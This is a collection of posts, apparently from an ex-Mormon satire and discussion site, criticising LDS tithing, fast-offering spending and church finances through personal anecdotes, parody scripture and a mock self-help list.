Money for use in local expenditures is allocated back to the Stake .
It is derived from sacrament meeting attendance figures taken from a " magic month " and on a ward by ward basis .
The SP then decides what amount to allocate to each ward for their yearly budget .
In some stakes like the one in Austin , TX that I lived in , the SP was focused on temple attendance , so they would charter monthly buses between Austin and the Dallas temple .
( They are expensive if you have ever hired one . )
So there the wards had a much smaller budget than in other places ( the total YM budget for the entire year was $ 200 - To pay all scouting awards , camping fees , and share of combined APYW activities ) .
If the ward busts a budget , the SP catches the heat from SLC over it , and the stuff rolls down hill from there .
With respect to fast offering .
In Virginia when I got my first clerk assignment , our ward spent 3 - 4 dollars for ever one we took in .
They had a big push to convince families to pay more than the cost of the meals you did not eat .
Our family , on 1st Lieutenant pay in the DC area , and as part of the " bishopric team " , went from $ 15 a month to $ 125 .
And this is in addition to tithing if you remember .
The big problem was the cost of living .
If someone lost their job for three months and had their bills picked up by the bishop , you burned through a lot of small contributions very fast .
But at least they helped folks who needed it and they still lived by the mantra " We take care of our own . "
Bishops were then forced to be more restrictive and had to justify everything they did to the corporate infrastructure during PPIs .
The wards then dropped to about 3 to 1 as the norm , with the occasional surplus month .
One of the interesting things in all of this is that there was only one unit in the stake during the early period my experience covers that was in the " black " , meaning they took in more FO monies than they spent .
That unit was the Spanish branch .
Those who made the least per capita .
The big difference was probably they paid rent and apartment sized utilities rather than mortgages and house expenses , as well as other cultural differences .
The last time I was called as a clerk it was for the finances and I lasted a month or so .
It is one of the " straws " they accelerated the thinking shift that made possible my exit .
I hated being a support guy in the clerk job .
I had done it in the different places for well over 10 years accumulated time , and I had developed the skill set to be very efficient and good at it .
But there was not any personal growth anymore .
It does not do anything for personal " spirituality " at least for me , as I do n't receive spiritual fulfillment from just being " in the know " or being close to the power base .
I wanted to help people ( a following Jesus thing ) .
I could not understand why God would disregard my feelings to the degree that I would have to do this " thing " again .
DW felt the same was and was confused also .
I was frustrated to get tagged with a " desperation " calling instead of being blessed with an " inspired " calling .
Is n't it weird how we condition ourselves to make the plate of crap palatable ?
It took so much effort to snap the world view and see the all the pieces make the true puzzle .
We sit in BPc meetings and see how the callings are made , yet we pretend , pretend , pretend .
We fail to accept and acknowledge the truth .
They are all desperation callings .
2009 Return and Report Tithing Settlement by Brother Spendlove
Well , we finished up tithing settlement .
I thought I would finish out my thoughts on it .
All those who did n't make it in previously were called by a member of the bishopric to come in .
I had to snicker listening to the calls being made at the last minute .
I knew some of those being called had either paid no tithing or very little and really did n't want to be bothered with it .
The stupid bishopric counselors were so brainwashed they thought they were doing the Lord 's will trying to drag these poor souls in to meet .
In the end , they ended up dragging more people in this year than last so they should have pulled more tithing out of people this year than last but that was not the case .
I took a few minutes and compared last year 's stats with this year .
We had more people attend tithing settlement this year but we actually brought in less money than last .
Our ward last year sent in something like $ 775,000.00 or so , I can't remember the exact figure .
This year we sent roughly $ 650,000.00 .
I live in an extremely TBM ward .
If these figures our indicative of the church as a whole it looks like revenues are definitely down .
This is a decrease of almost 20 % so I would think the church has taken a big hit this year .
Is it the recession or is it less belief in the church or both ?
I know there were a small number who paid very little this year who used to be active and have kind of dropped off the radar .
I 'm not the only one who has quit paying .
Unfortunately , there are just a few of us .
When I had my tithing settlement I told the bish I had quit paying when the church lost meaning for me .
I told him some of my probs with the church and the lies and such and he basically acted like he knew that all along .
Surprisingly he did n't lecture or anything .
He had no answers .
He just wanted me to keep doing what I could and he would leave me alone .
Wow .
It is nice to not have a total jerk off bishop .
So my plan is to continue to just fade away .
He knows I want out and I guess he is hoping that leaving me alone will bring me to my senses .
Ha ha ... not gonna happen .
I 'm just going to be seen less and less until I make the formal break .

Wasteful use of fast offerings
04/07/2009 - by 2thdoc
I currently am a finance clerk and you 're correct in stating there is no overhead .
However , what is not recognized or known by the average member is the wasteful use of the fast offerings .
From my observation during three years of writing out checks , any Joe Blow can go to the bishop and get financial help .
I have untold examples of what I term abuse that made me cringe .
For example , a member family was living in a house owned by the member 's LDS father , who lived in a different state .
For a few months we made out $ 1600 rent checks to the dad for the son 's rent of his house !
So much for the idea of going to family first .
We pay utility bills and mortgage payments for people driving new cars and dressed in the latest fashions .
We frequently pay for " essentials " like internet and cell phone bills .
It goes on and on .
Fitting the definition of humanitarian aid here is really stretching it .
I had always felt so good about my generous donations to the fast offering fund , believing it was helping the hungry and naked with no loss to expensive overhead , but I , for one , will never contribute another penny because of the program 's wasteful management .
I would like to bear my untestimony of tithing
12/23/2008 - by ausgaz
And that I know being un -Mormon is true .
Just before the market crash my wife and I decided to make a life transition and I quit my job to start a business .
That is going well however we had decided to adjust our living standards until full income was returned .
So things were tighter than usual .
A few years ago when we left the church we decided not to pay tithing and we knew the blessings would flow .
A few days ago we received an unexpected cheque in the mail for just over $ 800 , our tax return was $ 1,000 's more than we expected , interest rates have dropped significantly in Australia recently , our investments have gone gang busters when most things are tanking , petrol has dropped in price , we sold our minivan for $ 2,000 more than expected and rental income from our rental property recently went up by 30 % .
While the mormon gods looked after OK , they did require 10 % of our money as an ongoing fee .
Since withdrawing from that investment scheme , we have done a lot better !
I bear my untestimony that happiness can only be found in unmormonism and that blessings will flow from ignoring its precepts .
In the name of cheese and rice , Amen .
Re-Inspired Section 89
03/19/2008 - by Cats
1. A Word of Weird - dumb , for the fattening of that silly circle of naturally high priests , assembled in Salt Lake City , and the lesser Joe Mo priests , and also the saints in eating the high quality beef of Zion --
2 . To be sent with much eating ; not by commitment patterns or restraint , but by regurgitation in the words of wizened old men , showing much froth in the ordering of root beer and the candy of God in the whole bowl of mastication of all saints until the last crumb --
3 . Given for the principle servings with promise of more servings , adapted to the stomach capacity of the weak and the weakest of all saints , who are or can be called saints .
4. Behold , cheerily , thus saith the Lord unto your cravings :
In consequence of evils of vegetarians and designs of weight loss companies which do and will exist in the hearts of conspiring vegans in the almost but not quite last days , I have sworn you , and sworn you more , to give me your word that you will see the wisdom of consumption bolstered by revelation --
5 . That inasmuch as any Mormon eateth animals or strong animal byproducts among you , behold it is very good , and either meat or the things made from it is tasty in the sight of your Father , only make sure you often assemble yourselves together to offer up your animal sacraments before him .
6 . And , behold , this should be consumed with root beer , yea , pure and not caffeinated root beer of the greatest tasting kind , of your own make .
7 . And , again , caffeinated drinks are not for the belly , but for the washing of gentile , inactive and apostate bellies .
8 . And again , food cooked with wine or spirits is not for the body , neither for the belly , and is not good for Mormons , but butter , lard , and vegetable oils are for meats and all baked goodies , to be used generously and with judiciousness and skill .
9 . And again , coffee , teas , energy drinks , colas , wine , beer , hard liquors , smoking and drugs deemed illegal by the government are not for the body or belly .
10 .
And again , verily I say unto you , all wholesome government approved drugs God hath ordained for the depression , overweight nature , and general complaints of Mormons --
11 . Every drug in the season of your complaints thereof , and every ham after the funeral thereof ; all these to be used substances and to be obtuse of their chemical natures and thanksgiving to the doctors who proscribe them .
12 . Yea , flesh also of cows , pigs , sheep and of the chickens and turkeys of the farm , I , the Lord , have ordained for the use of Mormons and not just on Thanksgiving ; nevertheless they must to be used ever Sunday ;
13 .
And it is pleasing unto me that they should be used , at all occasions , cold or hot , and definitely at family meals .
14 .
All grains , sugars , substitutes , additives and corn syrups are ordained for the use of Mormons and of hormonally enhanced domestic animals , to be the stuff to eat , not only for Mormons but women to increase their waists and the men of heaven to keep fat and their interests from all wild temptations that run or creep on the earth ;
15 .
And these food cravings hath God made for the use of Mormons in times of excess pornography and excess sexual hunger .
16 .
All gaining weight is good for the Mormon ; it is also the fatness of the divine ; that which yieldeth fatness , whether in the upper body round or the lower body round --
17 . Nevertheless , meat and potatoes for men , and corn syrup and bread for the woman , and baked goods for the children , and heads , feet , bones , blood , intestines , lungs , spleens , livers , ligaments , fat trimmings , unborn babies , and other parts not generally consumed by humans for the dogs and for cats , and for all beasts of the field , and other barely useful animals .
18 .
And all saints who remember to keep and do these sayings , walking in obedience to ignore the ingredients , shall receive healthy expansions in their navels and narrowness to their minds ;
19 .
And shall find wisdom and great treasures of knowledge , even hidden treasures that have no real connection to the scriptures ;
20 .
And shall have fun and not be cheery , and shall talk and not show restraint .
21 . And I , the Lord , give unto them a promise , that the organics and anti-additive bug shall pass by them , as the children of The True Church , and not bite them .
Amen .
Food Storage Nazi
10/06/2006 - Temple Recommend Holder in Birmingham
During a recent lesson in Relief Society , our resident Food Storage Nazi asked each of us publicly about our current stage of preparedness .
When she got to me , I replied that I 'm all set : I have a Mossburg shotgun , 10,000 rounds of ammunition , and whatever my good friend has stored in HER basement !
The Food Storage Nazi did n't crack a smile .
She has NO sense of humor whatsoever .
My other friend 's reply was that she 's ' good to go ' as well ; she has 40 cases of Slim - Fast and Diet Coke stored up .
Everyone saw the humor in it except this nutty broad ; who brought as a ' treat ' to the meeting : stored bottled tap water and some really nasty homemade snack bars that looked like particleboard , but probably tasted worse !
She berated us all for not signing up with her to buy dried carrots in a can and margarine powder .
More on Utah bankruptcy rate and tithing ( perspective of a social scientist )
01/19/2006 - Mojo Jojo
True Believing Mormons argue that ï¿ ½Most honest tithe payers are able to pay their tithes and still budget their money to maintain a happy life .ï¿½
I suspect they are correct , but they entirely miss the point , as do most people who comment on this topic .
The issue is not whether paying tithing ï¿½causes ï¿½ bankruptcy , per se , but whether paying tithing ï¿½contributes at the marginï¿½ in a significant way to bankruptcy .
I think that we are on shaky ground to suggest that tithing is the cause of bankruptcy in Utah .
We are on more solid ground to argue that tithing is a contributory cause of bankruptcy in Utah .
It is also important to note that all states have a bankruptcy rate .
And people in those states by and large donï¿½t pay tithing .
So clearly there are other forces at work , and clearly some important ones .
Framed as a question for empirical research , the relevant question is why is the bankruptcy rate in Utah higher than in other states ?
Evidently , people in Utah appear to systematically possess certain attributes not shared by people in other states that contribute to their marginally higher bankruptcy rates .
What we want to find out is what those attributes are .
Casual observation leads one quite reasonably to identify tithing as one attribute of Utahans not shared by residents of other states .
More , we know ( thanks to Nogginï¿½s analysis ) that tithing constitutes a significant portion of disposable income , which , at the margin , can have a significant impact on the household budget of particularly poor , lower middle - class , and middle - class households , but also on upper middle - class households , depending on their other financial flows .
Thus it is perfectly reasonable and indeed expected that one would hypothesize that tithing is a contributory factor in explaining Utahï¿½s higher bankruptcy rates .
Indeed , any social scientist worth his or her salt would include tithing as a ï¿½explanatory ï¿½ variable in any model trying to explain differential bankruptcy rates .
When I was a professor at BYU , I was involved to some extent in the founding of the Center for Economic Self - Reliance in the Marriott School .
During one of the planning meetings , we were told that then President Bateman suggested that the Center try to account for the high bankruptcy rates in Utah .
So , we ( we being several well - published and reputable social scientists ) stood around discussing Utah bankruptcy and its possible causes .
Not one person there mentioned tithing as a possibly contributory factor .
I ï¿½m not sure whether it was because they did not consider it relevant , or because they were too afraid to bring it up for fear of social censure , although I suspect it was a bit of both .
( I did not bring it up , as I was already in the closet regarding my beliefs , or non-beliefs , and I did not want to draw attention to myself . )
But to me the whole scene was surreal in that several very capable social scientists either did not notice or were afraid to mention was obvious to anyone else , trained social scientist or no .
The Emperorï¿½s New Clothes played out in the halls of academia .
I am certain that this is a microcosm of what goes on within the LDS hierarchy every day : people exercising self - censorship out of fear of recrimination , even refusing to state the obvious , when debating issues important to the church and the well - being of its members .
I would imagine that the LDS bureaucracy is riddled with inefficiencies for this very reason , among others .
Anyone who says that freedom of thought and expression exist in LDS doctrine and culture clearly are self - deluded or have no idea what they ï¿½re talking about .
Observations from a former Bankruptcy attorney
01/19/2006 - by Skeptical
I no longer practice in that area and when I did it was only a small part of my practice .
I have never practiced in Utah and so cannot comment on contributing factors as a result of personal experience .
But I have read regarding the high level of bankruptcy filing in Utah and would make the following educated comments :
1. Tithing is a contributing factor .
Ten percent of a person 's income , together with a generous fast offering , could be used to pay personal living expenses instead of the church .
All of the LDS bankruptcies I did were tithe payors .
2 . Having a large family is still another contributing factor .
Many LDS members have larger than normal families requiring larger than normal incomes .
Usually , the incomes are n't sufficient for large family size .
3 . Lack of dual incomes .
Many LDS members believe that only the husband should earn income while the wife stays home with the children .
This reduces the amount of income available to LDS members to pay living expenses .
4 . The " inflated " Utah real estate market .
In my opinion , real estate values are exaggerated in Utah .
Young couples are paying too much to live in Zion , resulting in large mortgage payments .
5. Educational debt .
Utah prides itself in the high educational level of its residents .
This level of education comes with a price tag .
Usually , educational loans are considered non-dischargeable .
The problem is coupled when the wife is saddled with educational loans but no income to pay them .
So husband 's already stretched income is serving both of their student loan debt .
If you look at this list , at least four of the items ( 1 , 2 , 3 , and 5 ) are a result of LDS teachings .
People are told to overcome their fear ( which is a natural process of self - protection ) and exercise faith in paying tithing , having large families , getting advanced degrees and having mom stay at home .
The result of this type of living is bankruptcy .
21 Steps in Overcoming the Urge to Write Tithing Settlement Checks
12/11/2005 - by Jerry the Aspousestate
Be assured that you can be cured of your difficulty .
Many have been , both male and female , and you can be also if you determine that it must be so .
This determination is the first step .
That is where we begin .
You must decide that you will end this practice , and when you make that decision , the problem will be greatly reduced at once .
But it must be more than a hope or a wish , more than knowing that it is financially good for you .
It must be actually a DECISION .
If you truly make up your mind that you will be cured , then you will have the strength to resist any tendencies which you may have and any temptations which may come to you .
After you have made this decision , then observe the following specific guidelines :
A Guide to Self - Control :
1 . Never touch your checkbook except during bill - paying and gift - giving to normal organizations and persons .
2. Avoid being alone as much as possible .
Find good company - never Mormons - and stay in this good company .
3 . If you are associated with other persons having this same problem , YOU MUST BREAK OFF THEIR FRIENDSHIP .
Never associate with other people having the same weakness .
Do n't suppose that two of you will quit together , you never will .
You must get away from people of that kind .
Just to be in their presence will keep your problem foremost in your mind .
The problem must be taken OUT OF YOUR MIND for that is where it really exists .
Your mind must be on other and more wholesome things .
4 . When you reconcile your bank account , do not admire your balance .
Never stay at your desk more than five or six minutes -- just long enough to pay bills AND THEN GET OUT into a room where you will have some member of your family present .
5 . When in bed , if that is where your problem is most severe , dress yourself for the night so securely - mittens are a must - that you cannot easily hold your ball point pen , and so that it would be difficult and time consuming for you to remove those clothes .
By the time you started to remove protective clothing you would have sufficiently controlled your thinking that the temptation would leave you .
6 . If the temptation seems overpowering while you are in bed , GET OUT OF BED AND GO INTO THE KITCHEN AND FIX YOURSELF A SNACK OF GREEN JELL - O , even if it is in the middle of the night , and even if you are not hungry , and despite your fears of gaining weight .
The purpose behind this suggestion is that you GET YOUR MIND ON SOMETHING ELSE .
You are the subject of your thoughts , so to speak .
7. Never read Mormon material .
Never read about those trying to shame you into paying or wanting you to stop dreaming about having your name removed .
Keep it out of mind .
Remember --
" First a thought , then an act . "
The thought pattern must be changed .
You must not allow this problem to remain in your mind .
When you accomplish that , you soon will be free of the act .
8 . Put wholesome thoughts like coffee into your mind at all times .
Read good books .
Make a daily habit of reading at least one screen of posts on RfM or the Salamander Society because of their uplifting qualities .
9 . If you pray , do n't pray about this problem , for that will tend to keep it in your mind more than ever .
Pray for others to stop writing tithing settlement checks .
BUT KEEP THE PROBLEM OUT OF YOUR MIND BY NOT MENTIONING IT EVER -- NOT IN CONVERSATION WITH OTHERS , NOT IN YOUR PRAYERS .
KEEP IT OUT of your mind !
The attitude of a person toward his problem has an effect on how easy it is to overcome .
It is essential that a firm commitment be made to control the habit .
As a person understands his reasons for the behavior , and is sensitive to the conditions or situations that may trigger a desire for the act , he develops the power to control it .
Suggestions :
1 . Shout fervently and out loud when the temptations are the strongest .
2. Follow a program of vigorous daily exercise .
The exercises reduce emotional tension and depression and are absolutely basic to the solution of this problem .
Double your physical activity when you feel stress increasing .
3 . When the temptation to pay up is strong , yell STOP to those thoughts as loudly as you can in your mind .
It is important to turn your thoughts away from the foolish need to indulge in extortion .
4 . Set goals of abstinence , begin with a day , then a week , month , year and finally commit to never doing it again .
Until you commit yourself to never again you will always be open to temptation .
5 . Change in behavior and attitude is most easily achieved through a changed self - image .
Spend time every day imagining yourself strong and in control , easily overcoming tempting situations .
6. Begin to work daily on a self - improvement program .
Relate this plan to improving relationships with your family , Exmormons and others .
Strive to enhance your strengths and talents .
7 . Be outgoing and friendly .
Force yourself to be with others and learn to enjoy working and talking to them .
Use principles of developing friendships found in books such as How to Win Friends and Influence People by Dale Carnegie .
8 . Be aware of situations that depress you or that cause you to feel lonely , bored , frustrated or discouraged .
These emotional states can trigger the desire to support the Mormon secret underwear cult as a way of escape .
Plan in advance to counter these low periods through various activities , such as reading a book , visiting a friend , doing something athletic , etc .
9 . Make a pocket calendar for a month on a small card .
Carry it with you , but show it to no one .
If you have a lapse of self control , color the day red ( the color of your finances if you keep paying ) .
Your goal will be to have no red days .
The calendar becomes a strong visual reminder of self control and should be looked at when you are tempted to add another red day .
Keep your calendar up until you have at least three clear months .
10 .
A careful study will indicate you have had the problem at certain times and under certain conditions .
Try and recall , in detail , what your particular times and conditions were .
Now that you understand how it happens , plan to break the pattern through counter activities .
11 . In the field of psychotherapy there is a very effective technique called aversion therapy .
When we associate or think of something very distasteful with something which has been pleasurable , but undesirable , the distasteful thought and feeling will begin to cancel out that which was pleasurable .
If you associate something very distasteful with your loss of self - control it will help you to stop the act .
For example , if you are tempted to tithe , think of having to bathe in a tub of worms , and eat several of them as you do the act .
12 . During your toileting and shower activities leave the bathroom door partly open , to discourage being alone in total privacy if you took your checkbook in with you .
Take cool brief showers .
13 . Arise immediately in the mornings .
Do not lie in bed awake , no matter what time of day it is .
Get up and do something .
Start each day with an enthusiastic activity .
14 . Keep your bladder empty .
Refrain from drinking large amounts of red punch before retiring .
15 . Reduce the amount of funeral food and casseroles in your diet .
Eat as lightly as possible at night .
16 . Wear pajamas with long sleeves tied off over the hand you write with .
17 . Avoid people , situations , pictures or reading materials that might create the urge to pay .
18 . It is sometimes helpful to have a physical object to use in overcoming this problem .
A Playboy magazine , firmly held in hand , even in bed at night has proven helpful in extreme cases .
19 .
In very severe cases it may be necessary to tie a hand to the bed frame with a necktie in order that the habit in a semi-sleep condition can be broken .
20 .
Set up a reward system for your successes .
It does not have to be a big reward .
A quarter in a receptacle each time you overcome or reach a goal .
Spend it on something which delights you and will be a continuing reminder of your progress .
21 . Do not let yourself return to any past habit or attitude patterns which were part of your problem .
The Church of Jesus Christ of Latter - day Saints Never Gives Up . Be calmly and confidently on guard .
Keep a positive mental attitude .
You can win this fight !
The joy and strength you will feel when you do will give your whole life a radiant and financial glow of satisfaction and fulfillment .

Calling and election made sure
12/26/2004 - by Tyler
I wonder why the church does add a bit more charitable incentive ?
I mean , why not grant certain levels of " assured " heavenly merit for financial giving .
More than $ 500,000 but less than $ 1,000,000 the giver gets a free upgrade from the Telestial to the Terrestial .
More than $ 1,000,000 but less than 2.0 million , the giver gets his / her genitals restored for unlimited usage in the Terrestial Kingdom .
More than 2.0 million but less than 3.0 million , the giver gets to be " an helpmeet " in the lowest level of the Celestial Kingdom .
More than 3.0 million , but less than 4.0 million , the giver is still in the lowest level of the CK but is no lowly " an helpmeet , but has full genital resurrection to have up to 300,000 celestial mates .
More than 5.0 million , and the giver gets their calling and election made sure and an invite to the celebratory banquet in heaven with Joseph Smith , Brigham Young , Adam , Noah , Elias , Moses and all the other bigwigs .
Economic holy terrors
12/12/2004 - Steve Russell ( courtesy of Salt Lake Tribune letters to the editor )
We 're trying to figure out some way to make Utah fiscally healthy .
Public education is by far the biggest challenge .
We all know where those kids are coming from and are aware of the ecclesiastical engine that keeps them coming .
The Nov. 11 Tribune reported that the LDS Church rakes in $ 5.3 billion in tithing per year , all of which is tax deductible , and a significant percentage of which has to come from Utah .
Not surprisingly , state leaders are loathe to make the church contribute its fair share to the economy .
Tithers get to take up to 10 percent off the top of their taxable income while overpopulating the state with precious tax deductions .
When you add it all up , it is inescapable that non-Mormons in Utah are disproportionately taxed to the direct benefit of the LDS Church and its members .
In the same Tribune article , State Tax Commissioner Bruce Jensen stated that members of the tax reform task force consider tithing deductions as sacred , confirming that , for all intents and purposes , the church is the state .
If tithing is sacred , it ought to be done as a matter of faith , without benefit of a reward from the State Tax Commission .
If overbreeding is the will of the Lord , it ought not be subsidized by the state and its taxpayers .
You want a fix for the state economy right now ?
Eliminate those two economic holy terrors and we 're there .

Lying your way into the temple
02/26/2004 - David1
Many years ago when I was the ward clerk , I was responsible for noting temple recommend expiration dates as well as helping with financial statements .
I was amazed at the number of people in the ward who had temple recommends that didnï¿½t pay tithing .
In fact , only 6 or 7 families had paid what could be reasonably be considered a full tithing .
Yet about 60 people held current recommends .
It sure seems that the bishop could have looked at the bank deposits when granting a recommend .
Rather , this Judge of Israel accepted the lies of the faithful elite of the ward , the temple goers .
Weird , huh .
Lie and go to the temple or tell the truth and not be allowed .
My old mission pres . paid a heavy price - and still bares testimony ....
02/20/2004 - Still - Too - Close
Some background :
My mission pres from 77 - 79 Venezuela was a native .
He taught / supervised the church ed system in Ven for 20 + years - before and after the MP stint .
We had a mission reunion around 2000 .
I was happy that he had finally moved up to the states .
He was in his 70's .
There had n't been a reunion for his MP time in almost 20 years .
It was quite a treat to find 100 of us and actually have close to 50 show up after so many years .
Anyway , I degress .
During a quiet time at his apartment in Provo , he confided in me that the church retirement was only about $ 400 / mo .
He needed work .
At 70 + and poor english - not much available .
He was the bishop in the local latin ward and then the patriarch .
He explained that the church retirement was based on his pay in Ven. during his working years which was very low in $ $$ because of the exchange rate .
He had given his life to the church - 7 or so kids - at least 5 kids went on missions etc .
All this and he could n't get more than the $ 400 per month for him and his wife .
And he bore a solemn witness to the truth and bowed his head in humility .
I was appalled .
Chapter 2 : I was contacted in 2002 by his bishop to ask for help in paying for my old MP 's new calling in the new Ven.
Temple Presidency .
I helped for a while but when the Org decided to buy downtown SLC , I decided they did n't really need my money anymore ....
It is just a disgrace .
The only way for him to survive is to work more - and be paid by members - not the church for whom he works .
Unbelievable .
Any other amazing sacrifices in the modern Org ?
Despite paying 0 % tithing this year , I got a bigger than expected bonus
02/04/2004 - Harry
My wife 's cognitive dissonance has to be kicking into high gear .
She was very worried when I stopped paying tithing at the end of 2002 .
She just new some disaster was right around the corner .
We even went to tithing settlement together together this year and she sat there while the bishop told me how disappointed he was that I did n't pay any tithing this year .
He was very worried about us .
I always get my bonus check in Feb .
I warned my wife ahead of time not to expect anything , and at the very most I would be getting x number of dollars for my bonus .
I sincerely did n't expect a big bonus this year and was prepared for no bonus at all and I prepared my wife for it .
We were pleasantly surprised .
Not only did I get a bonus , but it was more than twice the maximum amount I thought I might get .
It was on par with the nice big bonus I got last year when I first started doubting the church .
Since I stopped believeing , our finances have really improved , and my bonuses have increased .
My wife is so excited .
She 'll have this bonus spent before the end of the month .
I 'm happy I can provide this for her , but is it wrong for me to hope some cognitive dissonance about tithing kicks in ?
( posted exactly as received - no editing )
I have an issue with tithing .
I do believe in this church .
But I believe they are denying me and my family the right to go to the temple unless we pay a fee of course !
THEY CALL TITHING .
THIS REALLY DISTURBES ME.
We did try to pay a full tithing once before .
our bishop told us to have faith in the lord and he will help us and then others told us of blessings they received while paying tithing .
I told the bishop we did not have the money to pay 300 or 400 .
dollars a month !
but he just reasured me again so I said okay ?
well the blessings we got were a washer and dryer that broke and two car engines blew up !
wow what great blessings huh !?
he also said after we started paying for awhile that he could no longer give us food which is why we were able to pay in the first place so , I smiled and agreed .
well , the month we had to buy our own food toliet paper etc .
the tithing check bounced !
needless to say the bishop told us to hold off on paying tithing for a while because it screws up the books .
we never got food help again either .
Im more convienced everyday that GOD does not want me to suffer my 8 children with 10 percent of my husbands 40,000 a year job .
the person making the money is supposed to pay the tithing not the one who sends the out the bills which is me the wife .
but one bishop said to me . well who pays the bills ?
you know writes the checks , well I do so he told me I had to pay it ( wrong ) anyway this has got me so pissed off !
sorry about that but this is how I feel .
got would not want our morgage to bounceand leave our 8 children homeless to pay tithing !

Editor 's note : The Lampoon regrets that you had better luck following your Bishop and Prophet 's advice not to use birth control .
Thr best way for a TBM ( True Believing Mormon ) to kick the tithing habit is a little at a time .
Start off by not paying on the small stuff like garden produce which amounts to less than ten bucks in most cases .
Next is the gross or net tax issue and saving for a mission can push them into the net camp .
Then start taking other church expenses out of tithing .
Like the time you eat a hundred bucks planning the ward activity .
I really like the idea of the guy paying his parking tickets at BYU out of tithng .
Next is the realizatin that time is money and that everone in the church is equal .
So that attorney in your Bishopric who charges a thousand a hour justifies taking thousands off for home teaching or service projects .
Finally you cross the line into ways to get the church to pay you .

Do you want gross or net blessings ?
07/11/2003 - anon
While I was in an Elder 's Quorum meeting , the lesson topic was tithing .
When one elder asked whether it was appropriate to pay tithing on his gross or net income ( a crass question , yes , but relevant ) , he was told by the EQ President , " That depends , Brother .
Do you want gross or net blessings . "

Bank consumer tithing loans
03/07/2003 - EnochIpsen
I spent many years prepping docs for consumer loans at Gods ( Zions ) Bank beginning about Thanksgiving the tithing loans would start coming in .
Under purpose of loan they would put down " tithing . "
I was amazed at the number of loans that came through for this .
It really pissed off the manager of the loan center .
He was a bishop and later a member of the stake presidency .
e felt that one of the purposes of tithing was to teach sacrifice and borrowing money to pay it did not teach sacrifice .
Brigham Young Gets Railroaded Out of Tithing
01/02/2003 - Pat McKitrick
This gets right at the " divinity " of Mormon Tithing .
I saw a very interesting Documentary on KUED .
It was about Brigham Young , Mormon Labor , and the Rail Road construction in Utah including the completion of the U.S. Transcontinental Rail Road at Promintory Point .
It told how Brigham supplied Mormon labor for the R.R. Construction in Utah .
No doubt Brigham had the contract set up so that he would pocket the Lion 's share of the money .
The Rail Road Baron 's had other plans and they refused to pay Brigham .
The amount in question was just over a million dollars which was a lot of money back then .
Brigham sent a son back East to Washington to petition / lobby for the collection of the debt .
Things drug out and there was so much riding on the unseen money that the Utah economy was stifled .
Brigham plead for tolerance between the suffering Utahns .
When things got even more desperate he suspended " The LAW of Tithing " .
If the principle was real and Divine , this would have been a most critical time to have it in force to prove it by having it pouring out those immeasurable blessings ,
But that 's not what Prophet / Profit Brigham did !
Brigham had to put Tithing on hold because he knew it does NOT really work .
Funny !
How this story is never related in contemporary meetings or lesson manuals .
Tithing is theft by Church leaders in the name of God .
It makes me sick to think of all the money they are still stealing from True Believing Mormon family members .
Pay Tithing Your Own Way
11/10/2001 - Richard Packham
There is an exhaustive article by a BYU professor , Robert F. Bohn , in the January 1984 issue of Sunstone , 9:1:17 , " A Modern Look at Tithable Income . "
In it , he analyzes not only the net vs. gross question , but about a dozen other questions about how to figure one 's tithing obligation .
He concludes : " In spite of such occasional explicit interpretations by individual General Authorities , the First Presidency of the LDS church has not issued any definitive statement on the proper way to calculate tithing .
The General Handbook of Instructions , which presents the official position of the Church , says only that annual interest " is understood to mean income .
No one is justified in making any other statement than this ....
We feel that every member of the Church is entitled to make his own decision as to what he thinks he owes the Lord and to make payments accordingly . "
[ He is citing the 1984 version of the GHI , of course , but the same wording is included in the 1999 CHI . ]
Or , you can follow my method of figuring tithing : I add up all my blessings for the year , calculate how much of that is thanks to Mormonism , and I pay one - tenth of that .
Of course , it 's always ZERO ( one tenth of nothing is nothing ) .
Tithing Brigham's Way
10/26/2001 - anon
Back in Brigham 's day you gave your tithing to the Bishop .
He spent it on people and projects in the ward .
He might have kept some for his own efforts , that was allowed .
He was suppose to send 10 % of it to the Stake and they were suppose to send 10 % of that ( 1 % ) to Salt Lake .
And they only did that if Porter Rockwell came snooping around .
Today you give your tithing to the Bishop and he immediately sends all of it to Salt Lake .
Most wards collect around $ 1 to 2 million a year .
The church sends the ward back a measly amount for their budget , usually in the range of $ 10,000 a year .
That would be about 1 % of what is collected .
Exactly the reverse from Brigham 's day .
- 10/31/2001
I never paid one red cent to the Morg .
I figured what I gave to God was between God and me , not a church figure .
Being a convert , I was used to the plate being passed around , and really did n't like the idea of paying someone face to face and letting them know the exact amount I give .
So , I would go to church at a Catholic or a Lutheran service , get a real sermon , and pay my money to God there .
And only God knows what I paid , and He is n't the receipt - giving - out kind of being .

Count Your Many Tithings
07/12/2001 - anon
My Father was " South Trained . "
I 'm talking about the Old South .
And he hated the Black folks .
He was none too happy about Kimball 's Revelation in 1978 giving them the Priesthood .
So in protest , he quit paying tithing .
But he felt guilty with that extra money , the Lord 's money .
So he put it into a simple Mutual fund with a low load that was indexed to the S&P 500 .
For over twenty years he faithfully paid his tithing into this fund .
At first it would have been easy to sign the whole thing back over to the church .
But the bigger it got , the more foolish it seemed , to give it up .
Like I said , my Father was " South trained . "
That also means he did n't have the benefits of a very good education .
He worked in blue - collar jobs all his life and made somewhat less than an average income .
He was n't lazy but he was n't driving a Mercedes either .
By the time he retired last year , he had over TWO MILLION DOLLARS in his tithing fund !
Now is he suppose to give it all back to the church to avoid the fires of hell ?
Or only the original capital he payed in every month plus 10 % of the accrued interest , which would n't even be half of it ?
I think this is not so much a story of the parasite - ism of the Mormon church as it is a story of the effects of frugality coupled with a wise investment plan .
But it does point out vividly , just what they 're really asking for when they innocently demand 10 % of your lifetime income .
Its millions of dollars .
It is easier to become a millionaire than to be a life - time 100 % tithing payer .
How the Mormon Rich Get Richer
07/06/2001 - JohnC of recovery bbs
Several weeks ago , I posted an analysis to demonstrate that wealthy people pay a smaller percentage of their income into tithing , when the tax benefits are considered .
Someone recently posted about paying tithing with appreciated assets , which provides an even greater tax break , since the contributor receives a tax deduction for the market value of the asset even though he never paid tax on the appreciation .
For example , suppose that Boyd K. Packer makes $ 125,000 in apostolic salary , and his investment in 10,000 shares of a Utah technology firm , Daw Technologies , increases in value from $ 25,000 to $ 125,000 .
If he sold his stock , he would have a gross income of $ 225,000 , on which he should pay $ 22,500 in tithing .
Instead , he donates 1000 shares of the appreciated stock , worth $ 12,500 ( for which he only paid $ 2500 ) , to the church , to cover his tithing .
Furthermore , the contribution reduces his taxes by $ 3875 ( assuming 31 % marginal tax rate ) .
His net outlay is $ 8,625 , or less than 4 % of his increase in net worth .
Is there any wonder why the rich Mormons get richer while the poor get poorer ?
Paying Tithing With Stocks
07/04/2001 - Never Again of recovery bbs
The Church does n't trade stocks much really .
They buy companies that they hold forever ( Bonneville Communications being the best example ) and they sell stock that has been donated by members for their tithing .
